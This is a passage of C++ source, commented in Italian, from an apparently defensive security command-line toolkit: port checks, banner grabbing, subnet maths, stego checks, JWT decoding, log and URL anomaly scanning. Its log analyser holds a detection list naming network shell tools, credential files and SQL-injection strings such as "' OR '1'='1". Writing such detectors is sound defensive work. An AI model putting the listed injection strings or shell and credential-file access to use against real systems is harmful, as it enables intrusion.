        setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
        setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
        struct sockaddr_in sa{};
        sa.sin_family=AF_INET;
        sa.sin_port=htons(port);
        inet_pton(AF_INET,(*seen.begin()).c_str(),&sa.sin_addr);
        bool open=(connect(sock,(struct sockaddr*)&sa,sizeof(sa))==0);
        close(sock);
        std::cout << "    " << (open?Color::BGREEN+"[✓]":Color::DIM+"[ ]") << Color::RESET
                  << " " << std::setw(5) << port << "  " << svc << "\n";
    }
    freeaddrinfo(res);
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: subnet — calcolatore CIDR/subnet
// ─────────────────────────────────────────────
void cmdSubnet(const std::vector<std::string>& args) {
    if (args.size() < 2) {
        std::cout << Color::YELLOW << "Uso: subnet <ip/cidr>   es: subnet 192.168.1.0/24\n" << Color::RESET; return;
    }
    std::string input = args[1];
    auto slash = input.find('/');
    if (slash == std::string::npos) { std::cout << Color::RED << "  Formato: ip/cidr\n" << Color::RESET; return; }
    std::string ipStr  = input.substr(0, slash);
    int prefix = std::stoi(input.substr(slash+1));
    if (prefix < 0 || prefix > 32) { std::cout << Color::RED << "  Prefisso CIDR non valido (0-32)\n" << Color::RESET; return; }

    // Converte IP in uint32
    struct in_addr ia{};
    if (inet_pton(AF_INET, ipStr.c_str(), &ia) != 1) { std::cout << Color::RED << "  IP non valido\n" << Color::RESET; return; }
    uint32_t ip   = ntohl(ia.s_addr);
    uint32_t mask = prefix == 0 ? 0 : (~0u << (32 - prefix));
    uint32_t net  = ip & mask;
    uint32_t bcast= net | ~mask;
    uint32_t first= net + 1;
    uint32_t last = bcast - 1;
    uint64_t hosts= (prefix >= 31) ? (1u << (32-prefix)) : ((uint64_t)1 << (32-prefix)) - 2;

    auto toStr = [](uint32_t v) {
        return std::to_string((v>>24)&0xFF)+"."+std::to_string((v>>16)&0xFF)+
               "."+std::to_string((v>>8)&0xFF)+"."+std::to_string(v&0xFF);
    };

    std::cout << Color::CYAN << "\n  🌐 SUBNET CALCULATOR\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Input         : " << Color::WHITE << input << "\n";
    std::cout << Color::YELLOW << "  Network       : " << Color::GREEN  << toStr(net)   << "/" << prefix << "\n";
    std::cout << Color::YELLOW << "  Subnet mask   : " << Color::WHITE  << toStr(mask)  << "\n";
    std::cout << Color::YELLOW << "  Wildcard mask : " << Color::WHITE  << toStr(~mask) << "\n";
    std::cout << Color::YELLOW << "  Broadcast     : " << Color::RED    << toStr(bcast) << "\n";
    std::cout << Color::YELLOW << "  First host    : " << Color::GREEN  << toStr(first) << "\n";
    std::cout << Color::YELLOW << "  Last host     : " << Color::GREEN  << toStr(last)  << "\n";
    std::cout << Color::YELLOW << "  Host disponibili: " << Color::WHITE << hosts        << "\n";
    // Classe IP
    uint8_t a = (net>>24)&0xFF;
    std::string cls = a<128?"A (0.0.0.0/8)":a<192?"B (128.0.0.0/16)":a<224?"C (192.0.0.0/24)":"D/E (multicast/riservato)";
    bool priv = (a==10)||(a==172&&((net>>16&0xFF)>=16)&&((net>>16&0xFF)<=31))||(a==192&&((net>>16)&0xFF)==168);
    std::cout << Color::YELLOW << "  Classe IP     : " << Color::WHITE << cls << "\n";
    std::cout << Color::YELLOW << "  Spazio privato: " << (priv?Color::GREEN+"Sì":Color::RED+"No") << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: banner — grab banner da servizio TCP
// ─────────────────────────────────────────────
void cmdBanner(const std::vector<std::string>& args) {
    if (args.size() < 3) { std::cout << Color::YELLOW << "Uso: banner <host> <porta>\n" << Color::RESET; return; }
    std::string host = args[1];
    std::string port = args[2];

    struct addrinfo hints{}, *res=nullptr;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &res)!=0) {
        std::cout << Color::RED << "  Impossibile risolvere host.\n" << Color::RESET; return;
    }
    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    struct timeval tv{3,0};
    setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
    setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));

    std::cout << Color::CYAN << "\n  📡 BANNER GRAB: " << host << ":" << port << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;

    if (connect(sock, res->ai_addr, res->ai_addrlen)!=0) {
        std::cout << Color::RED << "  Connessione rifiutata / timeout.\n" << Color::RESET;
        close(sock); freeaddrinfo(res); return;
    }
    freeaddrinfo(res);
    char buf[2048]={0};
    ssize_t n = recv(sock, buf, sizeof(buf)-1, 0);
    if (n <= 0) {
        // Prova a inviare un probe
        const char* probe = "HEAD / HTTP/1.0\r\n\r\n";
        send(sock, probe, strlen(probe), 0);
        n = recv(sock, buf, sizeof(buf)-1, 0);
    }
    close(sock);
    if (n > 0) {
        std::string banner(buf, n);
        std::cout << Color::GREEN;
        for (char c : banner) {
            if (c=='\r') continue;
            if (c<32&&c!='\n'&&c!='\t') std::cout << Color::DIM << "." << Color::GREEN;
            else std::cout << c;
        }
        std::cout << Color::RESET << "\n";
    } else {
        std::cout << Color::DIM << "  Nessun banner ricevuto.\n" << Color::RESET;
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: stego — analisi steganografica
// ─────────────────────────────────────────────
void cmdStego(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: stego <file>\n" << Color::RESET; return; }
    std::string path = args[1];
    std::ifstream f(path, std::ios::binary);
    if (!f) { std::cout << Color::RED << "File non trovato.\n" << Color::RESET; return; }
    f.seekg(0,std::ios::end); size_t fsize=f.tellg(); f.seekg(0);
    std::vector<uint8_t> data(fsize);
    f.read((char*)data.data(), fsize);

    std::cout << Color::CYAN << "\n  🕵️  ANALISI STEGANOGRAFICA: " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────────\n" << Color::RESET;

    // 1. Cerca dati after EOF (per JPEG/PNG/ZIP)
    size_t eofOffset = fsize;
    // JPEG: FF D9
    for (size_t i=0;i+1<fsize;i++) {
        if (data[i]==0xFF&&data[i+1]==0xD9) { eofOffset=i+2; break; }
    }
    // PNG: IEND chunk (AE 42 60 82)
    for (size_t i=0;i+7<fsize;i++) {
        if (data[i]=='I'&&data[i+1]=='E'&&data[i+2]=='N'&&data[i+3]=='D') { eofOffset=i+8; break; }
    }
    bool dataAfterEof = (eofOffset < fsize && eofOffset > 0);
    std::cout << Color::YELLOW << "  [" << (dataAfterEof?Color::BRED+"!":Color::GREEN+"✓") << Color::YELLOW << "] "
              << Color::WHITE << "Dati dopo EOF: ";
    if (dataAfterEof) std::cout << Color::BRED << fsize-eofOffset << " byte sospetti a offset 0x" << std::hex << eofOffset << std::dec << "\n";
    else              std::cout << Color::GREEN << "nessun dato extra\n";

    // 2. Analisi LSB (per immagini BMP/raw)
    // Conta i bit LSB: se distribuzione è ~50/50 potrebbe esserci dati nascosti
    size_t lsb0=0, lsb1=0;
    size_t check = std::min(fsize,(size_t)65536);
    for (size_t i=0;i<check;i++) { if(data[i]&1) lsb1++; else lsb0++; }
    double lsbRatio = (double)lsb1/(lsb0+lsb1);
    bool lsbSuspect = (lsbRatio>0.48&&lsbRatio<0.52);
    std::cout << Color::YELLOW << "  [" << (lsbSuspect?Color::YELLOW+"?":Color::GREEN+"✓") << Color::YELLOW << "] "
              << Color::WHITE << "LSB ratio: " << std::fixed << std::setprecision(3) << lsbRatio
              << (lsbSuspect?" → distribuzione ~50/50 (sospetta)":" → normale") << "\n";

    // 3. Cerca stringhe NULL-delimitate insolite
    int nullStrings=0; std::string cur2;
    for (size_t i=0;i<std::min(fsize,(size_t)32768);i++) {
        if (data[i]==0) { if(cur2.size()>6) nullStrings++; cur2.clear(); }
        else if (data[i]>=32&&data[i]<=126) cur2+=data[i];
        else cur2.clear();
    }
    std::cout << Color::YELLOW << "  [" << (nullStrings>5?Color::YELLOW+"?":Color::GREEN+"✓") << Color::YELLOW << "] "
              << Color::WHITE << "Stringhe null-delimitate: " << nullStrings << "\n";

    // 4. Entropia per blocchi (individua zone sospette)
    std::cout << Color::YELLOW << "\n  Mappa entropia per blocchi (ogni blocco = 1KB):\n" << Color::RESET;
    std::cout << Color::DIM << "  ";
    for (size_t i=0;i<fsize;i+=1024) {
        size_t bsz=std::min((size_t)1024,fsize-i);
        size_t freq2[256]={};
        for (size_t j=0;j<bsz;j++) freq2[data[i+j]]++;
        double ent=0;
        for (int k=0;k<256;k++) if(freq2[k]>0){double p=(double)freq2[k]/bsz;ent-=p*log2(p);}
        char c = ent>7.5?'#':ent>5.5?'=':ent>3.0?'-':'.';
        std::string col = ent>7.5?Color::RED:ent>5.5?Color::YELLOW:Color::GREEN;
        std::cout << col << c << Color::RESET;
        if ((i/1024)%80==79) std::cout << "\n  ";
    }
    std::cout << "\n" << Color::DIM << "  Legenda: . bassa  - media  = alta  # molto alta (sospetta)\n" << Color::RESET << "\n";
}

// ─────────────────────────────────────────────
//  CMD: jwt — decodifica JSON Web Token
// ─────────────────────────────────────────────
void cmdJwt(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: jwt <token>\n" << Color::RESET; return; }
    std::string token = args[1];

    auto b64UrlDecode = [](std::string s) {
        // Base64url → Base64 standard
        std::replace(s.begin(),s.end(),'-','+');
        std::replace(s.begin(),s.end(),'_','/');
        while(s.size()%4) s+='=';
        const std::string chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string out; int val=0,bits=-8;
        for(unsigned char c:s){
            if(c=='=') break;
            auto pos=chars.find(c);
            if(pos==std::string::npos) continue;
            val=(val<<6)+(int)pos; bits+=6;
            if(bits>=0){out+=(char)((val>>bits)&0xFF);bits-=8;}
        }
        return out;
    };

    std::cout << Color::CYAN << "\n  🪙 JWT DECODER\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;

    std::vector<std::string> parts;
    std::istringstream ss(token);
    std::string part;
    while(std::getline(ss,part,'.')) parts.push_back(part);

    if (parts.size()<2) { std::cout << Color::RED << "  Token JWT non valido (servono 3 parti).\n" << Color::RESET; return; }

    std::vector<std::string> labels={"HEADER","PAYLOAD","SIGNATURE"};
    for (size_t i=0;i<parts.size();i++) {
        std::cout << Color::BRED << "\n  ── " << labels[i<3?i:2] << " ──\n" << Color::RESET;
        if (i==2) {
            std::cout << Color::DIM << "  " << parts[i] << "\n" << Color::RESET;
            std::cout << Color::YELLOW << "  ⚠  La firma non viene verificata senza la chiave segreta.\n" << Color::RESET;
        } else {
            std::string decoded = b64UrlDecode(parts[i]);
            // Pretty-print JSON semplice
            int indent=0; bool inStr=false;
            std::cout << Color::GREEN << "  ";
            for (char c : decoded) {
                if (c=='"') { inStr=!inStr; std::cout << Color::WHITE << c << Color::GREEN; }
                else if (!inStr&&(c=='{'||c=='[')) { std::cout<<c<<"\n"<<std::string((++indent)*2+2,' '); }
                else if (!inStr&&(c=='}'||c==']')) { std::cout<<"\n"<<std::string((--indent)*2+2,' ')<<c; }
                else if (!inStr&&c==',') { std::cout<<c<<"\n"<<std::string(indent*2+2,' '); }
                else if (!inStr&&c==':') { std::cout<<Color::YELLOW<<c<<Color::GREEN<<" "; }
                else std::cout<<c;
            }
            std::cout << Color::RESET << "\n";
        }
    }

    // Avvisi di sicurezza
    std::cout << Color::YELLOW << "\n  Analisi sicurezza:\n" << Color::RESET;
    std::string header = b64UrlDecode(parts[0]);
    if (header.find("none")!=std::string::npos||header.find("\"alg\":\"none\"")!=std::string::npos)
        std::cout << Color::BRED << "  ⚠  Algoritmo 'none' — vulnerabile a signature bypass!\n" << Color::RESET;
    if (header.find("HS256")!=std::string::npos)
        std::cout << Color::YELLOW << "  ⚡ HS256 — shared secret, vulnerabile a brute-force se chiave debole.\n" << Color::RESET;
    if (header.find("RS256")!=std::string::npos||header.find("ES256")!=std::string::npos)
        std::cout << Color::GREEN << "  ✓  Algoritmo asimmetrico rilevato — più sicuro.\n" << Color::RESET;
    if (parts.size()==3) {
        std::string payload = b64UrlDecode(parts[1]);
        if (payload.find("exp")==std::string::npos)
            std::cout << Color::BRED << "  ⚠  Nessun campo 'exp' — token senza scadenza!\n" << Color::RESET;
        if (payload.find("iat")!=std::string::npos)
            std::cout << Color::GREEN << "  ✓  Campo 'iat' presente.\n" << Color::RESET;
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: encode — encoding vari
// ─────────────────────────────────────────────
void cmdEncode(const std::vector<std::string>& args) {
    if (args.size() < 3) {
        std::cout << Color::YELLOW << "Uso: encode <tipo> <stringa>\n"
                  << "  Tipi: base64, hex, binary, morse, caesar<n>, url, htmlent\n" << Color::RESET; return;
    }
    std::string type = toLower(args[1]);
    std::string input; for(size_t i=2;i<args.size();i++){if(i>2)input+=' ';input+=args[i];}

    std::cout << Color::CYAN << "\n  🔐 ENCODE [" << type << "]\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Input  : " << Color::WHITE << input << "\n";

    std::string result;
    static const std::string MORSE[] = {
        ".-","-...","-.-.","-..",".","..-.","--.","....","..",".---","-.-",".-..","--",
        "-.","---",".--.","--.-",".-.","...","-","..-","...-",".--","-..-","-.--","--.."
    };
    static const std::string MORSE_DIGITS[] = {"-----",".----","..---","...--","....-",".....","-....","--...","---..","----."};

    if (type=="base64") {
        result = base64Encode(input);
    } else if (type=="hex") {
        std::ostringstream oss;
        for(unsigned char c:input) oss<<std::hex<<std::setw(2)<<std::setfill('0')<<(int)c;
        result=oss.str();
    } else if (type=="binary") {
        for(unsigned char c:input){for(int b=7;b>=0;b--)result+=(char)('0'+((c>>b)&1));result+=' ';}
    } else if (type=="url") {
        for(unsigned char c:input){
            if(isalnum(c)||c=='-'||c=='_'||c=='.'||c=='~') result+=c;
            else{std::ostringstream oss;oss<<'%'<<std::hex<<std::setw(2)<<std::setfill('0')<<(int)c;result+=oss.str();}
        }
    } else if (type=="htmlent") {
        for(char c:input){
            if(c=='&') result+="&amp;";
            else if(c=='<') result+="&lt;";
            else if(c=='>') result+="&gt;";
            else if(c=='"') result+="&quot;";
            else if(c=='\'') result+="&#x27;";
            else result+=c;
        }
    } else if (type=="morse") {
        for(unsigned char c:input){
            if(c==' '){result+="/ ";}
            else if(c>='a'&&c<='z'){result+=MORSE[c-'a'];result+=' ';}
            else if(c>='A'&&c<='Z'){result+=MORSE[c-'A'];result+=' ';}
            else if(c>='0'&&c<='9'){result+=MORSE_DIGITS[c-'0'];result+=' ';}
        }
    } else if (type.substr(0,6)=="caesar") {
        int shift = (type.size()>6) ? std::stoi(type.substr(6)) : 13;
        for(char c:input){
            if(c>='a'&&c<='z') result+=(char)((c-'a'+shift)%26+'a');
            else if(c>='A'&&c<='Z') result+=(char)((c-'A'+shift)%26+'A');
            else result+=c;
        }
    } else { std::cout << Color::RED << "  Tipo non riconosciuto.\n" << Color::RESET; return; }

    std::cout << Color::YELLOW << "  Output : " << Color::GREEN << result << Color::RESET << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: logcheck — analizza file di log per anomalie
// ─────────────────────────────────────────────
void cmdLogCheck(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: logcheck <file.log> [--auth|--web|--ssh]\n" << Color::RESET; return; }
    std::string path = args[1];
    std::string mode = (args.size()>=3) ? toLower(args[2]) : "";

    std::ifstream f(path);
    if (!f) { std::cout << Color::RED << "File non trovato: " << path << "\n" << Color::RESET; return; }

    std::cout << Color::CYAN << "\n  📋 LOG ANALYZER: " << path << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;

    // Pattern sospetti
    std::vector<std::pair<std::string,std::string>> patterns = {
        {"Failed password",          "SSH brute-force tentativo"},
        {"Invalid user",             "SSH utente sconosciuto"},
        {"authentication failure",   "Autenticazione fallita"},
        {"POSSIBLE BREAK-IN",        "Possibile intrusione rilevata"},
        {"sudo:",                    "Uso sudo"},
        {"ROOT LOGIN",               "Login root"},
        {"su:",                      "Switch user"},
        {"segfault",                 "Segmentation fault (crash/exploit?)"},
        {"command not found",        "Comando non trovato"},
        {"/etc/passwd",              "Accesso passwd"},
        {"/etc/shadow",              "Accesso shadow"},
        {"chmod 777",                "Permessi world-writable"},
        {"wget ",                    "Download con wget"},
        {"curl ",                    "Download con curl"},
        {"base64",                   "Uso base64 (payload?)"},
        {"/bin/sh",                  "Shell invocata"},
        {"/bin/bash",                "Bash invocata"},
        {"nc ",                      "Netcat"},
        {"python",                   "Python invocato"},
        {"404",                      "HTTP 404 Not Found"},
        {"500",                      "HTTP 500 Server Error"},
        {"../",                      "Path traversal"},
        {"<script",                  "XSS tentativo"},
        {"UNION SELECT",             "SQL Injection tentativo"},
        {"DROP TABLE",               "SQL DROP tentativo"},
        {"' OR '1'='1",             "SQL Injection classico"},
    };

    std::map<std::string,int> counts;
    std::map<std::string,int> ipCount;
    std::string line;
    int lineNum=0, alarms=0;

    while(std::getline(f,line)) {
        lineNum++;
        // Estrai IP (semplice)
        for(size_t i=0;i<line.size();i++) {
            if(isdigit(line[i])) {
                // Prova a parsare IP
                int a,b,c,d; char dummy;
                if(sscanf(line.c_str()+i,"%d.%d.%d.%d%c",&a,&b,&c,&d,&dummy)==5
                   &&a>=0&&a<=255&&b>=0&&b<=255&&c>=0&&c<=255&&d>=0&&d<=255) {
                    std::string ip=std::to_string(a)+"."+std::to_string(b)+"."+std::to_string(c)+"."+std::to_string(d);
                    if(ip!="0.0.0.0"&&ip!="255.255.255.255") ipCount[ip]++;
                    break;
                }
            }
        }
        std::string llow=toLower(line);
        for(auto& [pat,desc]:patterns) {
            if(llow.find(toLower(pat))!=std::string::npos) {
                counts[desc]++;
                if(counts[desc]<=3) { // Mostra max 3 esempi per pattern
                    alarms++;
                    std::cout << Color::BRED << "  [L" << std::setw(5) << lineNum << "] "
                              << Color::YELLOW << desc << Color::RESET << "\n";
                    std::cout << Color::DIM << "    " << line.substr(0,120) << Color::RESET << "\n";
                }
            }
        }
    }

    // Sommario
    std::cout << Color::CYAN << "\n  ── SOMMARIO ──────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  Righe totali  : " << Color::WHITE << lineNum << "\n";
    std::cout << Color::YELLOW << "  Allarmi totali: " << (alarms>0?Color::BRED:Color::GREEN) << alarms << Color::RESET << "\n";
    if (!counts.empty()) {
        std::cout << Color::YELLOW << "\n  Pattern rilevati:\n" << Color::RESET;
        for(auto& [desc,cnt]:counts)
            std::cout << Color::DIM << "    " << std::left << std::setw(40) << desc
                      << Color::WHITE << cnt << "x\n" << Color::RESET;
    }
    // Top IP
    if (!ipCount.empty()) {
        std::vector<std::pair<int,std::string>> sortedIp;
        for(auto& [ip,cnt]:ipCount) sortedIp.push_back({cnt,ip});
        std::sort(sortedIp.rbegin(),sortedIp.rend());
        std::cout << Color::YELLOW << "\n  Top IP (per occorrenze):\n" << Color::RESET;
        for(int i=0;i<(int)std::min(sortedIp.size(),(size_t)10);i++)
            std::cout << Color::GREEN << "    " << std::left << std::setw(18) << sortedIp[i].second
                      << Color::WHITE << sortedIp[i].first << " occorrenze\n" << Color::RESET;
    }
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: urlparse — disseziona un URL
// ─────────────────────────────────────────────
void cmdUrlParse(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: urlparse <url>\n" << Color::RESET; return; }
    std::string url = args[1];

    std::cout << Color::CYAN << "\n  🔗 URL PARSER\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  URL completo: " << Color::WHITE << url << "\n\n";

    // Schema
    std::string schema, rest=url;
    auto spos=url.find("://");
    if(spos!=std::string::npos){schema=url.substr(0,spos);rest=url.substr(spos+3);}
    std::cout << Color::YELLOW << "  Schema   : " << Color::GREEN << (schema.empty()?"(nessuno)":schema) << "\n";

    // Credenziali
    auto atpos=rest.find('@');
    if(atpos!=std::string::npos&&atpos<rest.find('/')) {
        std::cout << Color::YELLOW << "  Credenziali: " << Color::BRED << rest.substr(0,atpos) << " ← ⚠ in chiaro!\n" << Color::RESET;
        rest=rest.substr(atpos+1);
    }

    // Host + porta
    std::string hostport, path2="/", query, frag;
    auto slashpos=rest.find('/');
    if(slashpos==std::string::npos){hostport=rest;}
    else{hostport=rest.substr(0,slashpos);path2=rest.substr(slashpos);}

    // Frammento
    auto hashpos=path2.find('#');
    if(hashpos!=std::string::npos){frag=path2.substr(hashpos+1);path2=path2.substr(0,hashpos);}
    // Query
    auto qpos=path2.find('?');
    if(qpos!=std::string::npos){query=path2.substr(qpos+1);path2=path2.substr(0,qpos);}

    // Host:porta
    auto colon2=hostport.find(':');
    std::string host2=hostport, port2;
    if(colon2!=std::string::npos){host2=hostport.substr(0,colon2);port2=hostport.substr(colon2+1);}

    std::cout << Color::YELLOW << "  Host     : " << Color::WHITE << host2 << "\n";
    if(!port2.empty()) std::cout << Color::YELLOW << "  Porta    : " << Color::WHITE << port2 << "\n";
    std::cout << Color::YELLOW << "  Path     : " << Color::WHITE << path2 << "\n";

    // Query params
    if(!query.empty()) {
        std::cout << Color::YELLOW << "  Query    :\n" << Color::RESET;
        std::istringstream qs(query);
        std::string param;
        while(std::getline(qs,param,'&')) {
            auto eq=param.find('=');
            if(eq!=std::string::npos)
                std::cout << Color::DIM << "    " << Color::CYAN << param.substr(0,eq)
                          << Color::DIM << " = " << Color::WHITE << param.substr(eq+1) << "\n" << Color::RESET;
            else
                std::cout << Color::DIM << "    " << param << "\n" << Color::RESET;
        }
        // Controlla pattern pericolosi nei params
        std::string qlow=toLower(query);
        if(qlow.find("script")!=std::string::npos) std::cout<<Color::BRED<<"  ⚠ Possibile XSS nella query!\n"<<Color::RESET;
        if(qlow.find("select")!=std::string::npos||qlow.find("union")!=std::string::npos)
            std::cout<<Color::BRED<<"  ⚠ Possibile SQL Injection nella query!\n"<<Color::RESET;
        if(query.find("../")!=std::string::npos||query.find("..%2F")!=std::string::npos)
            std::cout<<Color::BRED<<"  ⚠ Possibile Path Traversal nella query!\n"<<Color::RESET;
    }
    if(!frag.empty()) std::cout << Color::YELLOW << "  Fragment : " << Color::WHITE << frag << "\n";
    std::cout << "\n";
}

// ─────────────────────────────────────────────
//  CMD: ssl — info certificato SSL/TLS
// ─────────────────────────────────────────────
void cmdSsl(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: ssl <host> [porta]\n" << Color::RESET; return; }
    std::string host=args[1], port=(args.size()>=3?args[2]:"443");

    std::cout << Color::CYAN << "\n  🔒 SSL/TLS INFO: " << host << ":" << port << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;

    // Connessione TCP per verificare che la porta sia aperta
    struct addrinfo hints{},*res=nullptr;
    hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    if(getaddrinfo(host.c_str(),port.c_str(),&hints,&res)!=0){
        std::cout<<Color::RED<<"  Host non raggiungibile.\n"<<Color::RESET;return;
    }
    int sock=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    struct timeval tv{4,0};
    setsockopt(sock,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
    setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
    bool connected=(connect(sock,res->ai_addr,res->ai_addrlen)==0);
    close(sock); freeaddrinfo(res);

    if(!connected){std::cout<<Color::RED<<"  Porta "<<port<<" non raggiungibile.\n"<<Color::RESET;return;}
    std::cout<<Color::GREEN<<"  Porta "<<port<<" raggiungibile.\n"<<Color::RESET;

    // Genera comando openssl per info complete (lo mostreremo come suggerimento)
    std::cout<<Color::YELLOW<<"\n  Connessione TLS stabilita (TCP).\n";
    std::cout<<Color::WHITE<<"  Per analisi certificato completa usa:\n\n";
    std::cout<<Color::GREEN<<"    openssl s_client -connect "<<host<<":"<<port<<" -showcerts\n";
    std::cout<<"    openssl s_client -connect "<<host<<":"<<port<<" 2>/dev/null | openssl x509 -noout -text\n\n";
    std::cout<<Color::DIM<<"  Nexus non include OpenSSL per portabilità massima.\n";
    std::cout<<"  Controlla:\n";
    std::cout<<"    • Scadenza certificato\n";
    std::cout<<"    • Algoritmo firma (evita SHA-1)\n";
    std::cout<<"    • Versione TLS (TLS 1.2/1.3 ok, TLS 1.0/1.1 deprecati)\n";
    std::cout<<"    • Cipher suite (evita RC4, DES, 3DES, EXPORT)\n";
    std::cout<<"    • Wildcard vs singolo dominio\n";
    std::cout<<"    • Certificate Transparency log\n"<<Color::RESET<<"\n";
}

// ─────────────────────────────────────────────
//  CMD: macinfo — identifica vendor da MAC address
// ─────────────────────────────────────────────
void cmdMacInfo(const std::vector<std::string>& args) {
    if (args.size() < 2) { std::cout << Color::YELLOW << "Uso: macinfo <mac>  es: macinfo 00:1A:2B:3C:4D:5E\n" << Color::RESET; return; }
    std::string mac = args[1];

    // Estrai OUI (prime 3 ottetti)
    std::string oui;
    int count=0;
    for(char c:mac){
        if(c==':'||c=='-') {if(++count==3)break; oui+=':'; continue;}
        oui+=toupper(c);
    }
    // Normalizza
    std::string oui6;
    for(char c:oui) if(c!=':') oui6+=c;

    // Database OUI semplificato (i principali vendor)
    std::map<std::string,std::string> ouiDb = {
        {"000C29","VMware"},{"000569","VMware"},{"001C42","Parallels"},
        {"ACDE48","Apple"},{"F0D1A9","Apple"},{"3C2EFF","Apple"},{"A45E60","Apple"},
        {"001B63","Apple"},{"0050F2","Microsoft"},{"28CF3A","Microsoft"},
        {"001A11","Google"},{"94EB2C","Google"},{"3417EB","Amazon"},
        {"F4F5D8","Amazon"},{"00005E","IANA/Cisco"},{"00000C","Cisco"},
        {"001E49","Cisco"},{"00E04C","Realtek"},{"00269E","Realtek"},
        {"001B21","Intel"},{"8086F2","Intel"},{"B4B680","Intel"},
        {"9C5C8E","Huawei"},{"D07AB5","Huawei"},{"A08CF8","Samsung"},
        {"BC8CCD","Samsung"},{"001866","D-Link"},{"14D64D","D-Link"},
        {"00409C","Asante"},{"0002B3","Intel"},{"00E018","ASUSTek"},
        {"002354","Askey"},{"001CF0","TP-Link"},{"F4F26D","TP-Link"},
        {"B0487A","Netgear"},{"A40CE3","Netgear"},{"001E2A","Netgear"},
        {"000000","Xerox (broadcast)"},{"FFFFFFFFFFFF","Broadcast"},
        {"333300","IPv6 Multicast"},
    };

    std::string vendor = "Sconosciuto";
    if(oui6.size()>=6) {
        std::string prefix=oui6.substr(0,6);
        if(ouiDb.count(prefix)) vendor=ouiDb[prefix];
    }

    std::cout << Color::CYAN << "\n  📡 MAC ADDRESS INFO\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::YELLOW << "  MAC Address : " << Color::WHITE << mac << "\n";
    std::cout << Color::YELLOW << "  OUI (prefix): " << Color::WHITE << oui6.substr(0,std::min((int)oui6.size(),6)) << "\n";
    std::cout << Color::YELLOW << "  Vendor      : " << Color::GREEN << vendor << "\n";

    // Tipo indirizzo
    // Bit 0 del primo ottetto = multicast, bit 1 = locally administered
    int firstByte = 0;
    if(oui6.size()>=2) firstByte=(int)strtol(oui6.substr(0,2).c_str(),nullptr,16);
    std::cout << Color::YELLOW << "  Tipo        : " << Color::WHITE;
    if(firstByte==0xFF) std::cout<<"Broadcast\n";
    else if(firstByte&1) std::cout<<"Multicast\n";
    else std::cout<<"Unicast\n";
    std::cout << Color::YELLOW << "  Assegnazione: " << Color::WHITE
              << ((firstByte&2)?"Locally Administered (virtuale/modificato)":"Globally Unique (hardware reale)") << "\n\n";
}

// ─────────────────────────────────────────────
//  CMD: diff — confronto testuale tra due file
// ─────────────────────────────────────────────
void cmdDiff(const std::vector<std::string>& args) {
    if (args.size() < 3) { std::cout << Color::YELLOW << "Uso: diff <file1> <file2>\n" << Color::RESET; return; }
    std::ifstream f1(args[1]), f2(args[2]);
    if(!f1){std::cout<<Color::RED<<"  File non trovato: "<<args[1]<<"\n"<<Color::RESET;return;}
    if(!f2){std::cout<<Color::RED<<"  File non trovato: "<<args[2]<<"\n"<<Color::RESET;return;}

    std::vector<std::string> lines1, lines2;
    std::string l;
    while(std::getline(f1,l)) lines1.push_back(l);
    while(std::getline(f2,l)) lines2.push_back(l);

    std::cout << Color::CYAN << "\n  📄 DIFF: " << args[1] << " ↔ " << args[2] << "\n" << Color::RESET;
    std::cout << Color::DIM << "  ─────────────────────────────────────────────\n" << Color::RESET;
    std::cout << Color::GREEN << "  + " << args[2] << Color::RED << "  - " << args[1] << Color::RESET << "\n\n";

    size_t maxLines = std::max(lines1.size(), lines2.size());
    int diffs=0;
    for (size_t i=0; i<maxLines; i++) {
        std::string a = i<lines1.size() ? lines1[i] : "";
        std::string b = i<lines2.size() ? lines2[i] : "";
        if (a!=b) {
            diffs++;
            if(!a.empty()) std::cout<<Color::RED   <<"  - L"<<std::setw(4)<<i+1<<"  "<<a<<Color::RESET<<"\n";
            if(!b.empty()) std::cout<<Color::GREEN  <<"  + L"<<std::setw(4)<<i+1<<"  "<<b<<Color::RESET<<"\n";
        }
    }
